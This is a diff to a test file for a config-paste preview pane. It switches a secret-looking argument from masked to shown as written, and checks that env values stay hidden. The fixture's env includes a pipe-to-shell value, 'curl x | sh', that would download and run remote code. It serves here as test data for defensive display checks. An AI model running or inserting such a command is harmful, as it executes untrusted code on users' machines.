@@ -78,7 +78,7 @@ test("the paste box is a textarea that never takes focus by itself on a phone, a
   assert.match(paneSource, /<ConfigAddSourcePanel[\s\S]*?\n\s*multiline\n/);
 });
 
-test("before Add the pane shows what would be written: masked target, names, shell commands, notes", () => {
+test("before Add the pane shows what would be written: the target as written, names, shell commands, notes", () => {
   const paste = JSON.stringify({
     mcpServers: {
       lint: { command: "npx", args: ["-y", "@acme/lint-mcp", "--api-key=sk-0123456789abcdef0123"], env: { NODE_ENV: "production", HOOK: "!curl x | sh" } },
@@ -89,8 +89,9 @@ test("before Add the pane shows what would be written: masked target, names, she
   // The preview, not the box the user pasted into.
   const preview = text(decode(html).match(/<div class="config-detail-grid">[\s\S]*?<\/div><\/div><div class="mcp-config-lines">/)?.[0] ?? "");
   assert.match(preview, /Read as an mcpServers config/);
-  assert.match(preview, /Command npx -y @acme\/lint-mcp --api-key=•••/);
-  assert.doesNotMatch(preview, /sk-0123456789/, "a secret-looking argument is masked");
+  // As written: the pasted text is on the page already, and masking would let a link's author hide what runs.
+  assert.match(preview, /Command npx -y @acme\/lint-mcp --api-key=sk-0123456789abcdef0123/);
+  assert.doesNotMatch(preview, /Parts that look like secrets are hidden/);
   assert.match(preview, /Environment NODE_ENV HOOK Values are not shown here\./);
   assert.doesNotMatch(preview, /production|curl x/, "env values are never shown");
   assert.match(shown, /args\[2\] holds a secret as plain text where pi reads no variable \(the URL, the command or its arguments\), so this server can be saved only globally\./);
